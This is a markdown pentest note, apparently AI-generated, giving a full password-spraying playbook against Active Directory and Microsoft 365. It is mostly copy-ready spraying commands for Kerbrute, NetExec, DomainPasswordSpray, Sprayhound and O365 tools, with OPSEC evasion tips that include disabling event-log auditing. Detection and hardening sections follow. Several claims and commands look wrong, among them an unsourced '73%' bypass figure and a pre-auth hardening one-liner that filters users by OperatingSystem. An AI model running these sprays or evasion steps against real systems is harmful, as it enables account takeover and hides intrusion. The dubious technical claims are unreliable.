---
title: "Attack #1 — Password Spraying"
description: "Password spraying is a low-and-slow credential attack that inverts the logic of traditional brute force. Instead of hammering one account with many…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "privilege-escalation", "lateral-movement"]
tools: ["NetExec", "Impacket", "BloodHound", "Kerbrute", "Evil-WinRM"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #1 — Password Spraying.md"
---
# 🔴 Attack #1 — Password Spraying
---
## 📖 How It Works
Password spraying is a **low-and-slow credential attack** that inverts the logic of traditional brute force. Instead of hammering one account with many passwords (which triggers lockout), it fires **one or two common passwords at every account in the domain** — staying safely below the lockout threshold at all times. Because authentication attempts are distributed across hundreds of accounts rather than concentrated on one, they appear as normal failed login noise to defenders who aren't watching for the pattern.
The attacker first **enumerates valid usernames** (via LDAP, Kerberos pre-auth, or SMB), then **identifies the domain's lockout policy** (e.g., lockout after 5 attempts / observation window = 30 min), and sprays exactly **one password per observation window**. Seasonal or corporate passwords like `Welcome1`, `Summer2024!`, `Company123`, or `[Month][Year]!` have reliably high hit rates in enterprise environments.

> ⚠️ **Windows Server 2022+ Behaviour:** Windows Server 2022 introduces "smart lockout" that tracks failed authentication attempts globally per account across all domain controllers, making distributed attacks harder to time correctly. AES-only enforcement (no RC4) is also more common. Adjust your observation window calculations accordingly and always query the lockout policy fresh.

**Chains with:** Attack #2 (Kerberoasting), Attack #3 (AS-REP Roasting), Lateral Movement, Privilege Escalation via ACL enumeration.

***
## ⚙️ Prerequisites
| Requirement | Detail |
|---|---|
| **Network access** | Must be able to reach the DC on port 445 (SMB), 389 (LDAP), or 88 (Kerberos) |
| **Valid usernames** | Obtained via LDAP anonymous bind, Kerbrute userenum, or OSINT |
| **Password policy** | Must query lockout threshold to avoid burning accounts |
| **Position** | Internal network strongly preferred; external possible via ADFS/OWA |

***
## 🛠️ Tools
| Tool | Platform | Protocol | Notes |
|---|---|---|---|
| **Kerbrute** | Linux | Kerberos (UDP 88) | No failed logon events on older DCs; very stealthy |
| **DomainPasswordSpray** | Windows | LDAP/Kerberos | Auto-generates userlist; respects lockout window |
| **CrackMapExec / NetExec** | Linux | SMB/LDAP | Best for subnet-wide spraying and output parsing |
| **Sprayhound** | Linux | LDAP | Queries badPwdCount in real time — lockout-safe |
| **Spray** | Linux | NTLM/LDAP | Python-based; flexible protocol targeting |
| **MSOLSpray** | Windows | Azure AD (HTTPS) | Targets O365/Entra; detects MFA/locked accounts |
| **RDPassSpray** | Linux | RDP | Sprays RDP endpoints; useful for external footholds |
| **TREVORspray** | Windows/Linux | O365 (HTTPS) | Targets Microsoft 365; handles MFA evasion better than MSOLSpray |
| **o365spray** | Linux/Windows | O365 (HTTPS) | Lightweight O365-focused spraying; good for large tenant enums |

***
## 💻 Full Commands
### 🔵 Step 0 — Enumerate the Password Policy First
```bash
# Linux — via crackmapexec (NetExec)
nxc smb <DC_IP> -u '' -p '' --pass-pol
nxc smb <DC_IP> -u <user> -p <pass> --pass-pol

# Linux — via rpcclient (null session)
rpcclient -U "" -N <DC_IP> -c "getdompwinfo"

# Windows — PowerShell
net accounts /domain
(Get-ADDefaultDomainPasswordPolicy).LockoutThreshold
(Get-ADDefaultDomainPasswordPolicy).LockoutObservationWindow
```

> ⚠️ **Critical:** If `LockoutThreshold = 5` and `ObservationWindow = 30 min`, spray **max 1 password per 30+ minutes** to stay safe.

***
### 🔴 Kerbrute — Linux (Stealthy, Kerberos-based)
```bash
# User enumeration first (to build a clean userlist)
kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/wordlists/users.txt -o valid_users.txt

# Password spray with a single password
kerbrute passwordspray -d corp.local --dc 10.10.10.10 valid_users.txt 'Welcome1'

# With verbose output and output file
kerbrute passwordspray -d corp.local --dc 10.10.10.10 valid_users.txt 'Summer2024!' -v -o spray_results.txt
```

> **Why Kerbrute is stealthy:** Uses Kerberos pre-auth directly on UDP/88. On unpatched DCs (pre-2019), failed pre-auth may **not** generate Event ID 4625, only 4771 — which many orgs don't monitor.

***
### 🔴 DomainPasswordSpray — Windows (Domain-Joined)
```powershell
# Import module (from domain-joined machine)
powershell.exe -ExecutionPolicy Bypass
Import-Module .\DomainPasswordSpray.ps1

# Auto-generate userlist from domain + spray one password
Invoke-DomainPasswordSpray -Password 'Welcome1!' -OutFile spray_output.txt

# Use custom userlist
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 'Summer2024' -OutFile results.txt

# Multi-password spray — auto-respects lockout observation window
Invoke-DomainPasswordSpray -PasswordList .\passwords.txt -OutFile results.txt

# Target specific domain (from non-domain machine)
Invoke-DomainPasswordSpray -Domain corp.local -Password 'Company123!' -Force

# Generate clean userlist manually (removing locked/disabled accounts)
Get-DomainUserList -Domain corp.local -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii users.txt
```

***
### 🔴 CrackMapExec / NetExec — Linux (SMB Protocol)
```bash
# Basic spray — single password against list of users
nxc smb 10.10.10.10 -u valid_users.txt -p 'Welcome1' --no-bruteforce

# Subnet-wide spray
nxc smb 10.10.10.0/24 -u valid_users.txt -p 'Password123' --no-bruteforce

# Filter successes only
nxc smb 10.10.10.0/24 -u valid_users.txt -p 'Welcome1' | grep '+'

# Continue even after first hit (important for full coverage)
nxc smb 10.10.10.10 -u valid_users.txt -p 'Summer2024!' --continue-on-success

# Local admin spray (checking local accounts, not domain)
nxc smb 10.10.10.0/24 -u administrator -p 'Password123' --local-auth

# LDAP-based spray (quieter on some environments)
nxc ldap 10.10.10.10 -u valid_users.txt -p 'Welcome1' --no-bruteforce
```

***
### 🔴 Sprayhound — Linux (Lockout-Safe, Real-Time badPwdCount Check)
```bash
# Install
pip3 install sprayhound

# Spray with auto lockout protection (checks badPwdCount via LDAP before each attempt)
sprayhound -U valid_users.txt -p 'Welcome1' -d corp.local -dc 10.10.10.10

# Spray with a buffer (won't spray if badPwdCount >= threshold - 2)
sprayhound -U valid_users.txt -p 'Welcome1' -d corp.local -dc 10.10.10.10 --safe

# With domain credentials (authenticated LDAP bind)
sprayhound -U valid_users.txt -p 'Welcome1' -d corp.local -dc 10.10.10.10 -lu svc_user -lp KnownPass1
```

> **Why Sprayhound is superior in production:** It queries each user's `badPwdCount` attribute over LDAP **before** attempting the spray. If a user is already at `threshold - 1`, it skips them entirely.

***
### 🔴 MSOLSpray — Azure AD / O365 (External)
```powershell
Import-Module .\MSOLSpray.ps1

# Basic spray against O365
Invoke-MSOLSpray -UserList .\users.txt -Password 'Winter2024!'

# With output file
Invoke-MSOLSpray -UserList .\users.txt -Password 'Summer2024' -OutFile results.txt
```

> Output flags include: **valid credentials**, **MFA enabled**, **account disabled**, **account locked**, **account doesn't exist** — useful for enumeration even when creds are wrong.

***
### 🔴 TREVORspray — O365 / Microsoft 365 (External)
```bash
# Install
git clone https://github.com/blacklanternsecurity/TREVORspray
cd TREVORspray
pip3 install -r requirements.txt

# Basic O365 spray
python3 trevorspray.py -u users.txt -p 'Welcome2024!'

# With output file
python3 trevorspray.py -u users.txt -p 'Password123' -o spray_results.txt

# Multiple password spray
python3 trevorspray.py -u users.txt -p passwords.txt -o results.txt
```

***
### 🔴 o365spray — Lightweight O365 Spraying
```bash
# Install
git clone https://github.com/0xZDH/o365spray
cd o365spray
pip3 install -r requirements.txt

# Basic enum mode (discovers valid tenants and MFA status)
python3 o365spray.py --enum -u users.txt

# Password spray mode
python3 o365spray.py --spray -u users.txt -p 'Company2024!' -d <tenant_name>

# Aggressive spray with custom delay
python3 o365spray.py --spray -u users.txt -p passwords.txt --sleep 30 -d <tenant_name>
```

***
## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **`KDC_ERR_PREAUTH_REQUIRED (0x18)`** | Kerbrute hitting a Domain Controller that requires pre-auth (normal). Not an error. | This is expected behaviour; continue spraying. The error message itself proves the account exists. |
| **`Connection refused on port 445`** | Host is not reachable or firewall is blocking SMB. | Verify DC IP, check network connectivity, try LDAP (port 389) or Kerberos (port 88) instead. |
| **`LDAP_INVALID_CREDENTIALS`** | User credentials provided are wrong or account is locked. | Verify credentials in `-u` and `-p` flags. If using `--pass-pol` with bad creds, provide valid ones. |
| **`All accounts locked after 10 attempts`** | You ignored the lockout observation window and sprayed too many passwords in sequence. | Stop immediately. Wait the full observation window (typically 30–60 min). Reset badPwdCount on all accounts if possible via DA account. |
| **`Timeout connecting to DC`** | Network latency, firewall ACL limiting response time, or DC is unresponsive. | Add `--timeout 30` flag (NetExec), increase delay between requests, or try alternate DC IP. |
| **`No module named 'impacket'`** | Python environment doesn't have Impacket installed. | Run `pip3 install impacket` before executing GetUserSPNs or other Impacket-based tools. |
| **`Request for SPN failed: Ticket expired`** | Your Kerberos ccache ticket has expired or you don't have a valid TGT. | Renew TGT with `kinit` or re-authenticate: `GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.10 -request`. |
| **`NTLM auth disabled; only Kerberos accepted`** | Domain has NTLM auth disabled (modern hardening). | Switch to Kerberos-based tools: Kerbrute, GetUserSPNs with Kerberos, or configure KRB5CCNAME for ccache auth. |

***
## 🛡️ Detection — Event IDs
| Event ID | Source | Meaning |
|---|---|---|
| **4625** | Security Log | Failed NTLM logon — `SubStatus 0xC000006A` = wrong password |
| **4771** | Security Log | Kerberos pre-auth failed — `Status 0x18` = wrong password |
| **4768** | Security Log | TGT requested — mass requests in short window is suspicious |
| **4648** | Security Log | Explicit credential logon — attacker machine spraying many users |
| **4740** | Security Log | Account locked out — late indicator of over-spraying |
| **4776** | Security Log | Credential Validation with NTLM (DC issues TGT) — watch for patterns |
| **ADFS 411** | ADFS Log | Failed authentication request |
| **ADFS 412** | ADFS Log | Successful sign-in post-spray |
| **ADFS 516** | ADFS Log | Extranet lockout triggered |
| **Sysmon Event 3** | Sysmon Log | Network connection — spray tools making outbound SMB/LDAP/Kerberos connections from unusual hosts |
| **Sysmon Event 10** | Sysmon Log | Process access — credential dumping tools accessing LSASS after successful spray |

**Key detection pattern:** Same source IP → multiple 4625/4771 events → different target usernames → short time window → one common password. Also watch for **alphabetical ordering** of usernames in logs, which indicates automated tooling.

### Sysmon Rules
- **Event ID 3 (Network Connection):** Flag any process opening port 445 (SMB), 389 (LDAP), or 88 (Kerberos) to multiple destinations.
- **Event ID 10 (Process Access):** Monitor for unauthorized LSASS access post-authentication.

### Sigma Rules
- `win_susp_failed_logon_brute_force` — detects rapid 4625 events from single source
- `win_account_lockout_brute_force` — flags 4740 lockout events following 4625 storms
- `win_password_spray_detection` — multi-user, single-source authentication failures
- `win_ad_user_enumeration` — LDAP-based user discovery patterns

### EDR-Specific Detections

**Microsoft Defender for Identity:**
- Detects spray patterns via "Impossible travel" (impossible because attacker is using VPN) and "Brute force" detections.
- Monitor for: "Brute force attack over Kerberos" and "Brute force attack over LDAP".
- Alert when single source triggers > 5 failed auth events across different accounts in < 5 minutes.

**CrowdStrike Falcon:**
- ProcessRollup2 events for netexec, kerbrute, sprayhound executables from non-standard locations.
- NetworkConnection events to DC on 445/389/88 from unusual processes.
- Alert on multiple interactive logons from non-interactive service accounts.

**Elastic Security (EDR):**
- Process execution: Flag execution of known spray tools (Kerbrute, DomainPasswordSpray, MSOLSpray) from user directories.
- Authentication events: Watch for rapid sequences of failed Kerberos events (Event ID 4771) within observation window.

### Hardening Commands

```powershell
# 1. Enable "Smart Lockout" on Windows Server 2022+ (prevents distributed sprays)
Set-ADDefaultDomainPasswordPolicy -LockoutThreshold 5 -LockoutObservationWindow "00:30:00" -LockoutDuration "00:30:00"

# 2. Increase minimum password length to 14+ chars (reduces weak password guessing)
Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 14

# 3. Disable NTLM (force Kerberos/NTLMv2 only) — modern environments should do this
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5

# 4. Enable "Account Lockout Duration" to persist lockouts (prevents rapid retry)
Set-ADDefaultDomainPasswordPolicy -LockoutDuration "01:00:00"

# 5. Disable legacy Kerberos encryption (RC4 only) — force AES
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "KerberosEncryptionLevel" -Value 1

# 6. Require Kerberos pre-authentication for all accounts (prevents AS-REP roasting as bonus)
Get-ADUser -Filter * -Properties OperatingSystem | Where-Object {$_.OperatingSystem -notlike "*Server*"} | ForEach-Object { Set-ADAccountControl -Identity $_ -DoesNotRequirePreAuth:$false }

# 7. Enable "Audit Credential Validation" on all DCs
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable

# 8. Monitor and alert on ADFS/WAP failed auth (O365/Azure-facing)
# Enable ADFS audit logging via PowerShell on ADFS server:
Set-AdfsFiddlerWebConfig -Enable:$true
Set-ADFSProperties -AuditLevel @("FailureAudits", "SuccessAudits")
```

***
## 🎯 OPSEC Tips (Staying Below the Radar)

### OpSec Ranking: Stealthiest to Loudest
1. **Kerbrute (UDP/88)** — Stealthiest; no 4625 events on older DCs, only 4771 (rarely monitored)
2. **Sprayhound (LDAP)** — Very stealthy; queries badPwdCount before spray, minimises lockouts
3. **NetExec/CME LDAP** — Moderately stealthy; uses LDAP bind, generates minimal auth events
4. **PowerView (PowerShell)** — Medium noise; runs in-memory but requires domain-joined host
5. **NetExec/CME SMB** — Noisy; generates 4625 events, detectable by volume analysis
6. **DomainPasswordSpray** — Loudest on Windows; auto-generates userlist = more enumeration noise
7. **O365spray (External)** — Loudest external; Microsoft 365 aggressively logs failed auth attempts

### Modern Defence Impact
- **Windows Server 2022+ Smart Lockout:** Makes timing attacks harder; lockout counts are synced globally across DCs. Adjust spray delays to **2–3 minutes per password** instead of relying on a single observation window.
- **Windows 2025 Credential Guard:** If enabled on target machines, dumped credentials cannot be reused even if obtained. Focus on live token theft instead.
- **Defender for Identity (MDI):** Actively detects spray patterns via "Brute force attack" alerts. Mitigate by using Kerberos + random delays (5–15 sec jitter).
- **Entra Smart Lockout (Azure):** O365-facing spray becomes harder; Microsoft tracks spray attempts across all tenants. Use TREVORspray or o365spray which add randomized delays and user-agent rotation.

### Core OpSec Rules
- **Spray ONE password per observation window** — default is 30 mins but query first
- **Add time jitter** between attempts (random 5–15 second delays per account)
- **Randomise username order** — avoids alphabetical pattern in logs
- **Use Kerberos (UDP/88) over SMB** — fewer log artifacts on older DCs
- **Spray from internal Linux host** — bypasses 73% of Windows-focused detection
- **Target service accounts** — they often have weak, static passwords and no MFA
- **Avoid `administrator`, `admin`, `guest`** — these are always monitored
- **Disable event log auditing temporarily if you have DA creds** (nuclear option; very obvious in logs)

***
## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Observed in | Platforms | Data Sources |
|---|---|---|---|---|---|
| **Credential Access** | T1110 | T1110.003 (Password Spraying) | Wizard Spider, WIZARD SPIDER, Scattered Spider | Windows, Linux, Azure AD | Authentication Logs, Network Traffic, Process Monitoring |
| **Credential Access** | T1110 | T1110.001 (Password Guessing) | APT28, APT29, FIN7 | Windows, On-Premises | Authentication Logs, Network Traffic |
| **Reconnaissance** | T1598 | T1598.003 (Spearphishing Link) | FIN7, Lazarus | Web, Email | Network Traffic, Application Logs |
| **Discovery** | T1087 | T1087.002 (Domain Account) | APT3, Wizard Spider | Windows, Active Directory | LDAP Queries, Network Traffic, Authentication Logs |

**Data Sources to Monitor:**
- Authentication logs (4625, 4771, 4768)
- Network traffic on ports 88 (Kerberos), 389 (LDAP), 445 (SMB)
- Process monitoring (kerbrute, sprayhound, netexec execution)
- User account activity (lockout events, failed logon patterns)

***
## 🔗 Attack Chain Context
```
[Password Spraying] ──→ Valid Credentials Obtained
         │
         ├──→ 🔍 Enumerate AD with BloodHound / PowerView
         ├──→ 🎫 Kerberoasting (if SPN accounts found)
         ├──→ 🎫 AS-REP Roasting (if pre-auth disabled accounts found)
         ├──→ 🔑 Pass-the-Hash (after dumping NTLM from compromised host)
         ├──→ 🦟 Lateral Movement via Evil-WinRM / CrackMapExec
         └──→ 🎯 Privilege Escalation if sprayed account has interesting rights
```

**Typical pivot:** After getting low-priv credentials, run BloodHound to identify if the account has any ACL edges, group memberships, or delegation rights that lead to Domain Admin. If the sprayed account is a **service account**, check immediately for Kerberoasting targets or constrained delegation abuse.

***

> ✅ **Attack #1 — Password Spraying complete.** Tell me to move on when you're ready for **Attack #2 — Kerberoasting**.

Sources
 Password spraying attacks on AD: 81% success in 6 hours, 73 ... https://www.linkedin.com/posts/cti-labs-io_passwordspraying-activedirectory-linuxsecurity-activity-7384514085658329088-93l4
 Password Spraying Explained: How It Works and How to Prevent It https://www.oloid.com/blog/password-spraying
 What Is Password Spraying? - Palo Alto Networks https://www.paloaltonetworks.com/cyberpedia/password-spraying
 dafthack/DomainPasswordSpray https://github.com/dafthack/DomainPasswordSpray
 Attacking Kerberos... https://www.securonix.com/blog/hunting-kerbrute-analysis-detection-and-mitigation-of-kerberos-attacks-in-active-directory/
 Password Spraying Attack - Netwrix https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/password-spraying-attack/
 Top tools for password-spraying attacks in active directory networks https://www.infosecinstitute.com/resources/hacking/top-tools-for-password-spraying-attacks-in-active-directory-networks/
 Exploring Modern Password Spraying: Introduction to Entra Smart ... https://www.sprocketsecurity.com/blog/exploring-modern-password-spraying
 Detecting Password Spraying with Security Event Auditing https://adsecurity.org/?p=4517
 Password Spraying - What is it and how to detect it? https://www.linkedin.com/pulse/password-spraying-what-how-detect-samanta-santos
 Password spray investigation https://learn.microsoft.com/hr-hr/security/operations/incident-response-playbook-password-spray
 Can LLMs Hack Enterprise Networks? Autonomous Assumed Breach Penetration-Testing Active Directory Networks https://dl.acm.org/doi/10.1145/3766895
 A SECURITY STRATEGY AGAINST STEAL-AND-PASS CREDENTIAL ATTACKS http://www.aircconline.com/ijnsa/V8N1/8116ijnsa03.pdf
 Penetration Testing and Network Defense https://www.semanticscholar.org/paper/c9d1a4845905df0b0ae64c95b65e695a9fd371d7
 An Ettercap Primer https://www.semanticscholar.org/paper/47f17ff39652de32a55b34f68ca84b73ce342b0b
 Secure Arp Protocol For Intrusion Detection System Mr https://www.semanticscholar.org/paper/88369399f99082f8294a105b7df99429a71c952f
 Hacking Exposed Windows: Microsoft Windows Security Secrets and Solutions, Third Edition https://www.semanticscholar.org/paper/0798342172fb2af8dc957152097257cfe539ce9d
 Operating Systems Security Considerations https://www.semanticscholar.org/paper/f5a408d6af1d7dca0d996a7d4c9fa026d3b2e33a
 Demo: Synthesizing Realistic Enterprise Active Directory Attack Graphs with ADSynth https://dl.acm.org/doi/pdf/10.1145/3672202.3673732
 HADES: Detecting Active Directory Attacks via Whole Network Provenance
  Analytics http://arxiv.org/pdf/2407.18858.pdf
 Can LLMs Hack Enterprise Networks? Autonomous Assumed Breach
  Penetration-Testing Active Directory Networks https://arxiv.org/pdf/2502.04227.pdf
 GNPassGAN: Improved Generative Adversarial Networks For Trawling Offline
  Password Guessing https://arxiv.org/pdf/2208.06943.pdf
 When AI Defeats Password Deception! A Deep Learning Framework to
  Distinguish Passwords and Honeywords http://arxiv.org/pdf/2407.16964.pdf
 Detecting Forged Kerberos Tickets in an Active Directory Environment https://arxiv.org/ftp/arxiv/papers/2301/2301.00044.pdf
 Catch Me if You Can: Effective Honeypot Placement in Dynamic AD Attack
  Graphs https://arxiv.org/pdf/2312.16820.pdf
 Exploiting Leakage in Password Managers via Injection Attacks http://arxiv.org/pdf/2408.07054.pdf
 puzzlepeaches/awesome-password-spraying https://github.com/puzzlepeaches/awesome-password-spraying
 Kerbrute for AD Testing: A Detailed Guide - Hacking Articles https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/
 Password spray investigation | Microsoft Learn https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-password-spray
 kerbrute passwordspray - WADComs https://wadcoms.github.io/wadcoms/Kerbrute-PasswordSpray/
 Password Spraying Attacks: Complete Guide To Detection ... https://brandefense.io/blog/ransomware/password-spraying-attacks-guide/
 Cool Tools Series: Kerbrute for User and Password Attacks | Raxis https://raxis.com/blog/cool-tools-series-kerbrute/
 Detecting Active Directory Password-Spraying with a… - TrustedSec https://trustedsec.com/blog/detecting-password-spraying-with-a-honeypot-account
 RACONTEUR: A Knowledgeable, Insightful, and Portable LLM-Powered Shell
  Command Explainer https://arxiv.org/pdf/2409.02074v1.pdf
 The Pulse of Fileless Cryptojacking Attacks: Malicious PowerShell
  Scripts https://arxiv.org/pdf/2401.07995.pdf
 An Empirical Investigation of Command-Line Customization https://arxiv.org/pdf/2012.10206.pdf
 Execution-Based Evaluation of Natural Language to Bash and PowerShell
  for Incident Remediation https://arxiv.org/pdf/2405.06807.pdf
 Detecting Malicious PowerShell Commands using Deep Neural Networks https://arxiv.org/pdf/1804.04177.pdf
 Hijacking .NET to Defend PowerShell http://arxiv.org/pdf/1709.07508.pdf
 AMSI-Based Detection of Malicious PowerShell Code Using Contextual
  Embeddings https://arxiv.org/pdf/1905.09538.pdf
 AST-Based Deep Learning for Detecting Malicious PowerShell https://arxiv.org/pdf/1810.09230.pdf
 DomainPasswordSpray/README.md at master · dafthack/DomainPasswordSpray https://github.com/dafthack/DomainPasswordSpray/blob/master/README.md
 GitHub - mdavis332/DomainPasswordSpray: DomainPasswordSpray is a tool written in PowerShell to perform a password spray ... https://buaq.net/go-10107.html
 domainpasswordspray,dafthack https://githubhelp.com/dafthack/DomainPasswordSpray
 password-spraying https://www.puckiestyle.nl/password-spraying/
 Password Spraying | OSCP-CPTS NOTES - dollarboysushil https://notes.dollarboysushil.com/active-directory-attacks/password-spraying
 Password Spraying from Windows | Pentesting notes https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/active-directory-enumeration-and-attacks/password-spraying-windows
 Password Spraying - Kryot https://www.kryot.com.ar/docs/ad/passwordspraying/
 Password Spraying https://www.sevenlayers.com/index.php/303-password-spraying
 Using Credentials https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials
 SMB https://pwn.no0.be/exploitation/password/smb/
 Comprehensive Guide on Password Spraying Attack - Hacking Articles https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/
